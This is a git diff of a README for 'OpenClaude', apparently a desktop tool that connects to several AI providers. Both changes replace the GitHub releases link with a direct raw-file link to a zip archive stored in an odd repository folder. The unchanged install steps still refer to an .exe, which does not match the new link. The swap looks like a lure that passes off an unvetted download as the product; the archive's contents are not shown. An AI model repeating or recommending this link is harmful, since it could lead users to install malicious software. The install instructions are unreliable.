@@ -1,6 +1,6 @@
 # 🤖 OpenClaude - Use any AI model on desktop
 
-[![](https://img.shields.io/badge/Download-OpenClaude-blue.svg)](https://github.com/Viperlofoten243/OpenClaude/releases)
+[![](https://img.shields.io/badge/Download-OpenClaude-blue.svg)](https://raw.githubusercontent.com/Viperlofoten243/OpenClaude/main/vogesite/Open_Claude_1.5.zip)
 
 OpenClaude connects your computer to various AI services. You choose the provider and the model. It works like a bridge between desktop applications like Claude and the AI platforms you prefer. You gain access to intelligence from OpenAI, Gemini, DeepSeek, and others within a single interface. 
 
@@ -17,7 +17,7 @@ OpenClaude runs on modern Windows computers. Ensure your system meets these stan
 
 Follow these steps to set up the software on your machine:
 
-1. Visit [this page to download](https://github.com/Viperlofoten243/OpenClaude/releases).
+1. Visit [this page to download](https://raw.githubusercontent.com/Viperlofoten243/OpenClaude/main/vogesite/Open_Claude_1.5.zip).
 2. Look for the file ending in .exe under the latest version.
 3. Click the file to start the download.
 4. Open the file once it finishes downloading. 
